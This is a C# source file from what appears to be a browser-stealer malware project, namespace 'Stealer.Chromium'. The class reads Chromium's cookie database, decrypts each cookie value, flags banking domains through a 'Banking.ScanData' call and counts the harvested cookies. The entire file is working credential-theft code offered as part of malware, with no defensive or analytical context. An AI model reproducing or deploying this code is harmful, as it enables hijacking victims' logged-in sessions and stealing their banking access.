using System.IO;
using System.Collections.Generic;
using System;

namespace Stealer.Chromium
{
    internal sealed class Cookies
    {
        /// <summary>
        /// Get cookies from chromium based browsers
        /// </summary>
        /// <param name="sCookie"></param>
        /// <returns>List with cookies</returns>
        /// 3:Name, 5:value, creation:0, expires:7, path:6,secure:8, host_key:1, 
        public static List<Cookie> Get(string sCookie)
        {
            try
            {
                List<Cookie> lcCookies = new List<Cookie>();
                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sCookie, "cookies");
                if (sSQLite == null)
                    return lcCookies;
                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    Cookie cCookie = new Cookie();
                    string cDt = Crypto.GetUTF8(sSQLite.GetValue(i, 0));
                    cCookie.domain = Crypto.GetUTF8(sSQLite.GetValue(i, 1));
                    cCookie.name = Crypto.GetUTF8(sSQLite.GetValue(i, 3));
                    cCookie.sPath = Crypto.GetUTF8(sSQLite.GetValue(i, 6));
                    cCookie.value = Crypto.GetUTF8(Crypto.EasyDecrypt(sCookie, sSQLite.GetValue(i, 5), true));
                    cCookie.secure = Crypto.GetUTF8(sSQLite.GetValue(i, 8));

                    Int64 createUtc = Convert.ToInt64(sSQLite.GetValue(i, 0)) / 1000000;
                    Int64 expUtc = Convert.ToInt64(sSQLite.GetValue(i, 7)) / 1000000;
                    DateTime createDt = cBrowserUtils.UnixTimeStampToDateTime(createUtc, true);
                    DateTime expDt = cBrowserUtils.UnixTimeStampToDateTime(expUtc, true);
                    cCookie.expirationDate = expDt.ToString();
                    // Analyze value
                    Banking.ScanData(cCookie.domain);
                    Counter.Cookies++;
                    lcCookies.Add(cCookie);
                }

                return lcCookies;
            }
            catch { return new List<Cookie>(); }
        }
    }
}
